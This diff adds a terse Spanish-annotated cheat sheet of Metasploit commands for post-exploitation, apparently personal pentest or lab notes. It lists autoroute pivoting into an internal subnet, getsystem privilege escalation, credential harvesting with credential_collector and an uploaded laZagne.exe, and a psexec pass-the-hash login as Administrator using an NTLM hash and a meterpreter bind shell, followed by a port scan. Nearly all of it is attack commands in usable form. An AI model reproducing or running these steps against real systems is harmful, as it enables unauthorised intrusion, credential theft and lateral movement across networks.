@@ -1,0 +1,23 @@
+run autoroute -s 10.1.13.0/24
+run autoroute -p
+-------------------------pivotear-------------
+ps
+migrate ***
+getsystem
+run post/gather/credentials/credential_collector
+-------------------------------------------------
+upload /root/laZagne.exe c:\
+--------------------------------------------------
+use exploit/windows/smb/psexec
+set RHOST 
+
+msf exploit(psexec) > SMBUser Administrator
+msf exploit(psexec) > set SMBPass 561cbdae13ed5abd30aa94ddeb3cf52d
+************** aveces mejor asi************
+00000000000000000000000000000000:561cbdae13ed5abd30aa94ddeb3cf52d
+msf exploit(psexec) > set PAYLOAD windows/meterpreter/bind_tcp
+PAYLOAD => windows/meterpreter/bind_tcp
+msf exploit(psexec) > exploit
+-----------------------------------------------------------------
+use auxiliary/scanner/portscan/tcp
+-------------------------------------------
